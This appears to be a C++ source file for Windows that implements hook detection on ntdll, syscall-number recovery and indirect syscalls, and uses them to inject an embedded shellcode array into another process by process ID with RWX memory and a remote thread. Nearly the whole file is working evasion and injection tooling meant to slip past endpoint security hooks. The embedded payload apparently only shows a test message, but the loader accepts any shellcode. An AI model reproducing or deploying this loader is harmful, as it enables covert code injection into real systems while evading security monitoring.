// direct_indirect_syscall.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <algorithm>

typedef struct Export_funciton {
    ULONG_PTR Fun_adress;
    char* Name;
    ULONG_PTR Trampoline;
    bool hooked;
    BYTE SSN;
}*PExport_funciton;

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

std::vector<Export_funciton> Export_funciton_list;
std::vector<Export_funciton> Nt_Export_funciton_list;
std::vector<Export_funciton> Zw_Export_funciton_list;

typedef NTSTATUS(WINAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID, ULONG_PTR , PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(WINAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);



extern "C" NTSTATUS DirectSyscall(DWORD SSN, DWORD Number_Para, PVOID Parameter1, PVOID Parameter2, PVOID Parameter3, PVOID Parameter4, PVOID Parameter5, PVOID Parameter6, PVOID Parameter7, PVOID Parameter8, PVOID Parameter9, PVOID Parameter10, PVOID Parameter11, PVOID Parameter12);
extern "C" NTSTATUS InDirectSyscall(DWORD SSN, DWORD Number_Para, ULONG_PTR Trampoline, ULONG_PTR Back_home,PVOID Parameter1, PVOID Parameter2, PVOID Parameter3, PVOID Parameter4, PVOID Parameter5, PVOID Parameter6 , PVOID Parameter7, PVOID Parameter8, PVOID Parameter9, PVOID Parameter10, PVOID Parameter11, PVOID Parameter12);

bool Is_hooked(ULONG_PTR Function_adress) {
    BYTE* Check_hex = (BYTE*)Function_adress;
    if (*Check_hex == 0x4C) {
        Check_hex++;
        if (*Check_hex == 0x8b) {
            Check_hex++;
            if (*Check_hex == 0xd1) {
                Check_hex++;
                if (*Check_hex == 0xb8)
                {
                    return false;
                }
            }
        }
    }
    return true;
}

ULONG_PTR Find_Trampoline(ULONG_PTR Function_adress) {
    BYTE* Check_hex = (BYTE*)Function_adress;
    for (size_t i = 0; i < 100; i++)
     {
        BYTE* temp = Check_hex;
        if (*temp == 0x0f) {
            temp++;
            if (*temp == 0x05) {
                temp++;
                if (*temp == 0xc3) {
                    return (ULONG_PTR)Check_hex;
                }
            }
        }
        Check_hex++;
    }
}



//PVOID Unhooked(DWORD anchor) {
//    for (size_t i = 0; i < Nt_Export_funciton_list.size(); i++)
//    {
//        if (Nt_Export_funciton_list[i].hooked == true)
//        {
//            if (anchor > i)
//            {
//                Nt_Export_funciton_list[i].SSN = anchor - (anchor - i);
//                Zw_Export_funciton_list[i].SSN = anchor - (anchor - i);
//
//            }
//            else
//            {
//                Nt_Export_funciton_list[i].SSN = anchor + (i - anchor);
//                Zw_Export_funciton_list[i].SSN = anchor + (i - anchor);
//
//            }
//            
//        }
//    }
//    return 0;
//}

PVOID Unhooked() {
    for (size_t i = 0; i < Nt_Export_funciton_list.size(); i++)
    {
        if (Nt_Export_funciton_list[i].hooked == true)
        {
            int range = i+1;
            for (size_t range = 0; range < Nt_Export_funciton_list.size()-i; range++)
            {
                if (Nt_Export_funciton_list[i+ range +1].hooked == false){
                    
                    Nt_Export_funciton_list[i].SSN = Nt_Export_funciton_list[i + range + 1].SSN - range - 1;
                    Zw_Export_funciton_list[i].SSN = Nt_Export_funciton_list[i + range + 1].SSN - range - 1;
                    break;
                }
            }
            
        }
    }
    return 0;
}


PVOID Sort_and_Split_and_Found() {
    std::sort(Export_funciton_list.begin(), Export_funciton_list.end(),[](const Export_funciton& a, const Export_funciton& b) {
            return a.Fun_adress < b.Fun_adress;
        });
    DWORD anchor = 0;
    for (size_t i = 0; i < Export_funciton_list.size()-5; i+=2)
    {
        if (Export_funciton_list[i + 4].Name[0] == 'N' && Export_funciton_list[i + 4].Name[1] == 't')
        {
            
            Nt_Export_funciton_list.push_back(Export_funciton_list[i + 4]);
            Zw_Export_funciton_list.push_back(Export_funciton_list[i + 5]);
        }
        else
        {
            Nt_Export_funciton_list.push_back(Export_funciton_list[i + 5]);
            Zw_Export_funciton_list.push_back(Export_funciton_list[i + 4]);
        }
    }
    return 0;
}



void PrintExportFunctionList(std::vector<Export_funciton> list) {

    FILE* fp;
    freopen_s(&fp, "C:\\Users\\Acer-PC\\source\\repos\\direct_indirect_syscall\\list.txt", "w", stdout);

    std::cout << "===== Danh sách các Export Functions =====\n";

    for (size_t i = 0; i < list.size(); ++i) {
        Export_funciton& func = list[i];
        if ((ULONG_PTR)list[i].Fun_adress == 0x00007ffd113106d0)
        {
            printf("ok");
        }
        std::cout << "Function #" << i + 1 << ":\n";
        std::cout << "  Name      : " << (func.Name ? func.Name : "NULL") << "\n";
        std::cout << "  Address   : 0x" << std::hex << func.Fun_adress << std::dec << "\n";
        std::cout << "  Trampoline: 0x" << std::hex << func.Trampoline << std::dec << "\n";
        std::cout << "  Hooked    : " << (func.hooked ? "true" : "false") << "\n";
        std::cout << "  SSN       : " << static_cast<int>(func.SSN) << "\n";
        std::cout << "------------------------------------------\n";
    }

    fclose(fp); 
}


PVOID Export_Export_function() {
    PTEB pTeb = (PTEB)__readgsqword(0x30);
    PPEB pPeb = (PPEB)pTeb->ProcessEnvironmentBlock;
    PPEB_LDR_DATA pLDR = (PPEB_LDR_DATA)pPeb->Ldr;
    PLDR_DATA_TABLE_ENTRY pLDR_entry = (PLDR_DATA_TABLE_ENTRY)pLDR->InMemoryOrderModuleList.Flink;

    PVOID ntdll_imagebase = 0;
    while (pLDR_entry) {
        const wchar_t* name = L"ntdll.dll";
        const wchar_t* name_dll = pLDR_entry->FullDllName.Buffer;
        if (name_dll[0] == name[0] && name_dll[1] == name[1] && name_dll[2] == name[2] && name_dll[3] == name[3]) {
            ntdll_imagebase = pLDR_entry->Reserved2[0];
            break;
        }
        pLDR_entry = (PLDR_DATA_TABLE_ENTRY)pLDR_entry->Reserved1[0];
    }

    PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)ntdll_imagebase;
    PIMAGE_NT_HEADERS64 p_nt_header = (PIMAGE_NT_HEADERS64)((ULONG_PTR)p_dos_header->e_lfanew + (ULONG_PTR)ntdll_imagebase);
    PIMAGE_EXPORT_DIRECTORY  p_Export_directory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)p_nt_header->OptionalHeader.DataDirectory[0].VirtualAddress + (ULONG_PTR)ntdll_imagebase);
    WORD* Ordinal_value = (WORD*)(p_Export_directory->AddressOfNameOrdinals + (ULONG_PTR)ntdll_imagebase);
    DWORD* Adress_to_name_rva = (DWORD*)(p_Export_directory->AddressOfNames + (ULONG_PTR)ntdll_imagebase);
    DWORD* Adress_to_adress_rva = (DWORD*)(p_Export_directory->AddressOfFunctions + (ULONG_PTR)ntdll_imagebase);
    PExport_funciton pExport_function = new Export_funciton;


    for (WORD Ordinal_value_check = 0; Ordinal_value_check < p_Export_directory->NumberOfFunctions; Ordinal_value_check++)
    {
        if (Ordinal_value_check != 0) {
            Adress_to_name_rva++;
            Adress_to_adress_rva++;
        }
        bool have_name = false;
        char* name;
        if (Ordinal_value_check != *Ordinal_value)
        {
            Adress_to_adress_rva++;
            continue;
        }
        name = (char*)(*Adress_to_name_rva + (ULONG_PTR)ntdll_imagebase);
        char test1 = name[0];
        char test2 = name[1];
        if ((name[0] == 'N' && name[1] == 't') || (name[0] == 'Z' && name[1] == 'w'))
        {
            pExport_function->Name = name;
            ULONG_PTR b = (ULONG_PTR)(*Adress_to_adress_rva + (ULONG_PTR)ntdll_imagebase);
            pExport_function->Name = name;
            pExport_function->Fun_adress = (ULONG_PTR)(*Adress_to_adress_rva + (ULONG_PTR)ntdll_imagebase);
            if (name[0] == 'N' && name[1] == 't' && name[2] == 'd' && name[3] == 'l') {
                pExport_function->Name = name;
            }
            pExport_function->hooked = Is_hooked((ULONG_PTR)(*Adress_to_adress_rva + (ULONG_PTR)ntdll_imagebase));
            pExport_function->Trampoline = Find_Trampoline((ULONG_PTR)(*Adress_to_adress_rva + (ULONG_PTR)ntdll_imagebase));
            
            if (pExport_function->hooked == false)
            {
                BYTE* SSN_Number = (BYTE*)(pExport_function->Fun_adress + 0x4);
                pExport_function->SSN = *SSN_Number;
            }
            else
            {
                pExport_function->SSN = 0xFFFF;
            }
            Export_funciton_list.push_back(*pExport_function);

        }
        Ordinal_value++;

    }

    return 0;


}

NTSTATUS Nt_VirtualAlloc_Wrapper(const char* Name,HANDLE Proc_Handle, PVOID base_adress, ULONG_PTR  lpAddress, PSIZE_T dwSize, ULONG flAllocationType, ULONG flProtect) {
    
    DWORD SSN = 0;
    ULONG_PTR Trampoline = 0;
    DWORD* RelativeAdress_to_shellcode = (DWORD*)((ULONG_PTR)InDirectSyscall + 1);

    for (size_t i = 0; i < Nt_Export_funciton_list.size(); i++)
    {
        if (!strcmp(Nt_Export_funciton_list[i].Name,Name)) {
             SSN = Nt_Export_funciton_list[i].SSN;
             Trampoline = Nt_Export_funciton_list[i].Trampoline;
        }
        else if(!strcmp(Zw_Export_funciton_list[i].Name, Name))
        {
            SSN = Zw_Export_funciton_list[i].SSN;
            Trampoline = Zw_Export_funciton_list[i].Trampoline;

        }
    }
    //NTSTATUS Return_value = DirectSyscall(SSN, 6, &Proc_Handle, &base_adress, &lpAddress, &dwSize, &flAllocationType, &flProtect,0,0,0,0,0,0);
    NTSTATUS Return_value = InDirectSyscall(SSN, 6, Trampoline, (ULONG_PTR)InDirectSyscall + (ULONG_PTR)*RelativeAdress_to_shellcode + 0x69, &Proc_Handle, &base_adress, &lpAddress, &dwSize, &flAllocationType, &flProtect, 0, 0, 0, 0, 0, 0);
    return Return_value;
}

NTSTATUS Nt_NtProtectVirtualMemory_Wrapper(const char* Name, HANDLE Proc_Handle, PVOID base_adress, PSIZE_T dwSize, ULONG NewAccessProtection, PULONG OldAccessProtection) {

    DWORD SSN = 0;
    ULONG_PTR Trampoline = 0;
    DWORD* RelativeAdress_to_shellcode = (DWORD*)((ULONG_PTR)InDirectSyscall + 1);

    for (size_t i = 0; i < Nt_Export_funciton_list.size(); i++)
    {
        if (!strcmp(Nt_Export_funciton_list[i].Name, Name)) {
            SSN = Nt_Export_funciton_list[i].SSN;
            Trampoline = Nt_Export_funciton_list[i].Trampoline;
        }
        else if (!strcmp(Zw_Export_funciton_list[i].Name, Name))
        {
            SSN = Zw_Export_funciton_list[i].SSN;
            Trampoline = Zw_Export_funciton_list[i].Trampoline;

        }
    }

    //NTSTATUS Return_value = DirectSyscall(SSN, 5, &Proc_Handle, &base_adress, &dwSize, &NewAccessProtection, &OldAccessProtection,0,0,0,0,0,0,0);
    NTSTATUS Return_value = InDirectSyscall(SSN, 5, Trampoline, (ULONG_PTR)InDirectSyscall + (ULONG_PTR)*RelativeAdress_to_shellcode + 0x69, &Proc_Handle, &base_adress, &dwSize, &NewAccessProtection, &OldAccessProtection, 0, 0, 0, 0, 0, 0, 0);


    return Return_value;
}

NTSTATUS Nt_NtCreateThreadEx_Wrapper(const char* Name, PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList) {

    DWORD SSN = 0;
    ULONG_PTR Trampoline = 0;
    DWORD* RelativeAdress_to_shellcode = (DWORD*)((ULONG_PTR)InDirectSyscall + 1);

    for (size_t i = 0; i < Nt_Export_funciton_list.size(); i++)
    {
        if (!strcmp(Nt_Export_funciton_list[i].Name, Name)) {
            SSN = Nt_Export_funciton_list[i].SSN;
            Trampoline = Nt_Export_funciton_list[i].Trampoline;
        }
        else if (!strcmp(Zw_Export_funciton_list[i].Name, Name))
        {
            SSN = Zw_Export_funciton_list[i].SSN;
            Trampoline = Zw_Export_funciton_list[i].Trampoline;

        }
    }

    //NTSTATUS Return_value = DirectSyscall(SSN, 11, &ThreadHandle, &DesiredAccess, &ObjectAttributes, &ProcessHandle, &StartRoutine, &Argument, &CreateFlags, &ZeroBits,&StackSize,&AttributeList, &MaximumStackSize,0);
    NTSTATUS Return_value = InDirectSyscall(SSN, 11, Trampoline, (ULONG_PTR)InDirectSyscall + (ULONG_PTR)*RelativeAdress_to_shellcode + 0x69,&ThreadHandle, &DesiredAccess, &ObjectAttributes, &ProcessHandle, &StartRoutine, &Argument, &CreateFlags, &ZeroBits, &StackSize, &AttributeList, &MaximumStackSize, 0);

    return Return_value;
}


int main()
{
    char c;
    c = getchar();
    unsigned char shellcode[] = { 0x57,0x48,0x89,0xe7,0x48,0x83,0xe4,0xf0,0x48,0x83,0xec,0x20,0xe8,0x0f,0x01,0x00,0x00,0x48,0x89,0xfc,0x5f,0xc3,0x66,0x2e,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x65,0x48,0x8b,0x04,0x25,0x60,0x00,0x00,0x00,0x48,0x8b,0x40,0x18,0x41,0x89,0xca,0x4c,0x8b,0x58,0x20,0x4d,0x89,0xd9,0x66,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x49,0x8b,0x41,0x50,0x31,0xc9,0x4c,0x8d,0x40,0x02,0x0f,0xb7,0x00,0x66,0x85,0xc0,0x74,0x20,0x66,0x0f,0x1f,0x44,0x00,0x00,0x89,0xca,0x0f,0xb7,0xc0,0x49,0x83,0xc0,0x02,0xc1,0xe2,0x04,0x01,0xd0,0x01,0xc1,0x41,0x0f,0xb7,0x40,0xfe,0x66,0x85,0xc0,0x75,0xe6,0x41,0x39,0xca,0x74,0x09,0x4d,0x8b,0x09,0x4d,0x39,0xcb,0x75,0xc1,0xc3,0x49,0x8b,0x41,0x20,0xc3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x57,0x56,0x53,0x48,0x63,0x41,0x3c,0x8b,0xbc,0x01,0x88,0x00,0x00,0x00,0x48,0x01,0xcf,0x44,0x8b,0x4f,0x20,0x8b,0x5f,0x14,0x49,0x01,0xc9,0x85,0xdb,0x74,0x51,0x49,0x89,0xcb,0x89,0xd6,0x45,0x31,0xd2,0x66,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x41,0x8b,0x01,0x31,0xc9,0x4c,0x01,0xd8,0x4c,0x8d,0x40,0x01,0x0f,0xbe,0x00,0x84,0xc0,0x74,0x1c,0x0f,0x1f,0x44,0x00,0x00,0x89,0xca,0xc1,0xe2,0x04,0x01,0xd0,0x01,0xc1,0x4c,0x89,0xc0,0x49,0x83,0xc0,0x01,0x0f,0xbe,0x00,0x84,0xc0,0x75,0xe9,0x39,0xce,0x74,0x11,0x49,0x83,0xc2,0x01,0x49,0x83,0xc1,0x04,0x4c,0x39,0xd3,0x75,0xc0,0x5b,0x5e,0x5f,0xc3,0x8b,0x57,0x24,0x4b,0x8d,0x0c,0x53,0x8b,0x47,0x1c,0x5b,0x5e,0x0f,0xb7,0x14,0x11,0x5f,0x49,0x8d,0x14,0x93,0x8b,0x04,0x02,0x4c,0x01,0xd8,0xc3,0x48,0xb8,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x48,0x83,0xec,0x38,0x48,0x89,0x44,0x24,0x25,0xb8,0x6c,0x6c,0x00,0x00,0x66,0x89,0x44,0x24,0x2d,0xc6,0x44,0x24,0x2f,0x00,0xc7,0x44,0x24,0x20,0x74,0x65,0x73,0x74,0xc6,0x44,0x24,0x24,0x00,0x65,0x48,0x8b,0x04,0x25,0x60,0x00,0x00,0x00,0x48,0x8b,0x40,0x18,0x4c,0x8b,0x50,0x20,0x4d,0x89,0xd1,0x0f,0x1f,0x44,0x00,0x00,0x49,0x8b,0x41,0x50,0x4c,0x8d,0x40,0x02,0x0f,0xb7,0x00,0x66,0x85,0xc0,0x74,0x2a,0x31,0xc9,0x66,0x0f,0x1f,0x44,0x00,0x00,0x89,0xca,0x0f,0xb7,0xc0,0x49,0x83,0xc0,0x02,0xc1,0xe2,0x04,0x01,0xd0,0x01,0xc1,0x41,0x0f,0xb7,0x40,0xfe,0x66,0x85,0xc0,0x75,0xe6,0x81,0xf9,0x00,0x27,0x9b,0x77,0x74,0x3f,0x4d,0x8b,0x09,0x4d,0x39,0xca,0x75,0xbe,0x4c,0x89,0xd9,0xba,0x86,0x45,0x6a,0xef,0xe8,0xd9,0xfe,0xff,0xff,0x48,0x8d,0x4c,0x24,0x25,0xff,0xd0,0xba,0x7f,0x30,0x7b,0xb4,0x48,0x89,0xc1,0xe8,0xc5,0xfe,0xff,0xff,0x48,0x8d,0x54,0x24,0x20,0x45,0x31,0xc9,0x31,0xc9,0x49,0x89,0xd0,0xff,0xd0,0x31,0xc0,0x48,0x83,0xc4,0x38,0xc3,0x4d,0x8b,0x59,0x20,0xeb,0xc3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x00, };
    ULONG lpflOldProtect = 0;
    HANDLE hThread = 0;

    Export_Export_function();
    Sort_and_Split_and_Found();
    PrintExportFunctionList(Nt_Export_funciton_list);

    Unhooked();
    PrintExportFunctionList(Nt_Export_funciton_list);

    PVOID baseAddress = nullptr;
    SIZE_T size = sizeof(shellcode);

    ULONG_PTR ProcID = 21384;

    //get hooked Process handle 
    HANDLE Remote_Proc_Handle = OpenProcess(PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ, TRUE, ProcID);

    /*HMODULE hNtdll = LoadLibrary(TEXT("ntdll.dll"));
    NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");*/
    //NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    //NtAllocateVirtualMemory_t  NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    
    //NTSTATUS  b = NtAllocateVirtualMemory(GetCurrentProcess(), &pAddr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //if (NtProtectVirtualMemory(GetCurrentProcess(), &baseAddress, &size, PAGE_EXECUTE_READWRITE, &lpflOldProtect)) {
    //    std::cerr << "Failed to change protect. Error: " << GetLastError() << std::endl;
    //    return 0;
    //}
    //memcpy(baseAddress, shellcode, sizeof(shellcode));
    //NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS,0 ,GetCurrentProcess(), (LPTHREAD_START_ROUTINE)baseAddress,0,NULL,0,0,0,0);;
        
    
    //PVOID pAddr = VirtualAllocEx(Remote_Proc_Handle,NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //if (!VirtualProtectEx(Remote_Proc_Handle,pAddr, 1024, PAGE_EXECUTE_READWRITE, &lpflOldProtect)) {
    //    std::cerr << "Failed to change protect. Error: " << GetLastError() << std::endl;
    //    return 0;
    //}
    //WriteProcessMemory(Remote_Proc_Handle, pAddr, shellcode, sizeof(shellcode), 0);
    ////memcpy(pAddr, shellcode, sizeof(shellcode));
    //hThread = CreateRemoteThread(Remote_Proc_Handle,NULL, 0x00, (LPTHREAD_START_ROUTINE)pAddr, NULL, 0x00, NULL);

    if (Nt_VirtualAlloc_Wrapper("NtAllocateVirtualMemory", Remote_Proc_Handle, &baseAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
    {
        std::cerr << "Failed to get mem. Error: " << GetLastError() << std::endl;

    }
    if (Nt_NtProtectVirtualMemory_Wrapper("NtProtectVirtualMemory", Remote_Proc_Handle, &baseAddress, &size, PAGE_EXECUTE_READWRITE, &lpflOldProtect)) {
        std::cerr << "Failed to change protect. Error: " << GetLastError() << std::endl;
        return 0;
    }
    WriteProcessMemory(Remote_Proc_Handle, baseAddress, shellcode, sizeof(shellcode), 0);
    //memcpy(baseAddress, shellcode, sizeof(shellcode));
    if (Nt_NtCreateThreadEx_Wrapper("NtCreateThreadEx", &hThread, 0x1FFFFF, 0, Remote_Proc_Handle, (LPTHREAD_START_ROUTINE)baseAddress, 0, NULL, 0, 0, 0, 0)) {
        std::cerr << "Failed to change protect. Error: " << GetLastError() << std::endl;
        return 0;
    }

    WaitForSingleObject(hThread, INFINITE);
    //PrintExportFunctionList(Export_funciton_list);
    //PrintExportFunctionList(Export_funciton_list);

}

/*typedef struct Export_funciton {
    DWORD Fun_adress;
    char* Name;
    DWORD Trampoline;
    bool hooked;
    BYTE SSN;
}*PExport_funciton;

std::vector<Export_funciton> Export_funciton_list;

bool Is_hooked(DWORD Function_adress) {
    BYTE* Check_hex = (BYTE*)Function_adress;
    if (*Check_hex == 0x4C) {
        Check_hex++;
        if (*Check_hex == 0x8b){
            Check_hex++;
            if (*Check_hex == 0xd1) {
                Check_hex++;
                if (*Check_hex == 0xb8)
                {
                    return false;
                }
            }
        }
    }
    return true;
}

DWORD Find_Trampoline(DWORD Function_adress) {
    BYTE* Check_hex = (BYTE*)Function_adress;
    while (true) {
        BYTE* temp = Check_hex;
        if (*temp == 0x0f) {
            temp++;
            if (*temp == 0x05) {
                temp++;
                if (*temp == 0xc3) {
                    return (DWORD)Check_hex;
                }
            }
        }
        Check_hex++;
    }
}

PVOID Get_syscall_number() {

}

PVOID Unhooked() {

}

PVOID PrintInfor() {

}

PVOID Export_Export_function(){
    PTEB pTeb = (PTEB)__readfsdword(0x18);
    PPEB pPeb = (PPEB)pTeb->ProcessEnvironmentBlock;
    PPEB_LDR_DATA pLDR = (PPEB_LDR_DATA)pPeb->Ldr;
    PLDR_DATA_TABLE_ENTRY pLDR_entry = (PLDR_DATA_TABLE_ENTRY)pLDR->InMemoryOrderModuleList.Flink;

    PVOID ntdll_imagebase =0;
    while (pLDR_entry) {
        const wchar_t* name = L"ntdll.dll";
        const wchar_t* name_dll = pLDR_entry->FullDllName.Buffer;
        if (name_dll[0] == name[0] && name_dll[1] == name[1] && name_dll[2] == name[2] && name_dll[3] == name[3]) {
            ntdll_imagebase = pLDR_entry->Reserved2[0];
            break;
        }
        pLDR_entry = (PLDR_DATA_TABLE_ENTRY)pLDR_entry->Reserved1[0];
    }

    PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)ntdll_imagebase;
    PIMAGE_NT_HEADERS32 p_nt_header = (PIMAGE_NT_HEADERS32)((DWORD)p_dos_header->e_lfanew + (DWORD)ntdll_imagebase);
    PIMAGE_EXPORT_DIRECTORY  p_Export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)p_nt_header->OptionalHeader.DataDirectory[0].VirtualAddress + (DWORD)ntdll_imagebase);
    WORD* Ordinal_value = (WORD*)(p_Export_directory->AddressOfNameOrdinals + (DWORD)ntdll_imagebase);
    DWORD* Adress_to_name_rva = (DWORD*)(p_Export_directory->AddressOfNames + (DWORD)ntdll_imagebase);
    DWORD* Adress_to_adress_rva = (DWORD*)(p_Export_directory->AddressOfFunctions + (DWORD)ntdll_imagebase);


    for (WORD Ordinal_value_check = 0; Ordinal_value_check <p_Export_directory->NumberOfFunctions; Ordinal_value_check++)
    {
        if (Ordinal_value_check != 0) {
            Adress_to_name_rva++;
            Adress_to_adress_rva++;
        }
        PExport_funciton pExport_function = new Export_funciton;
        bool have_name = false;
        char* name;
        if (Ordinal_value_check != *Ordinal_value)
        {
            Adress_to_adress_rva++;
            continue;
        }
        //DWORD a = (DWORD)(*Adress_to_name_rva + (DWORD)ntdll_imagebase);
        name = (char*)(*Adress_to_name_rva + (DWORD)ntdll_imagebase);
        char test1 = name[0];
        char test2 = name[1];
        if ((name[0] == 'N' && name[1] == 't') || (name[0] == 'Z' && name[1] == 'w'))
        {
            pExport_function->Name = name;
            //00007ffb807f06d0
            //00007ffb80750000
            DWORD b = (DWORD)(*Adress_to_adress_rva + (DWORD)ntdll_imagebase);
            pExport_function->Name = name;
            pExport_function->Fun_adress = (DWORD)(*Adress_to_adress_rva + (DWORD)ntdll_imagebase);
            pExport_function->hooked = Is_hooked((DWORD)(*Adress_to_adress_rva + (DWORD)ntdll_imagebase));
            pExport_function->Trampoline = Find_Trampoline((DWORD)(*Adress_to_adress_rva + (DWORD)ntdll_imagebase));
            Export_funciton_list.push_back(*pExport_function);
           
        }  
        Ordinal_value++;
        
    }

    return 0;


}

int main()
{
    Export_Export_function();
}
*/
// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
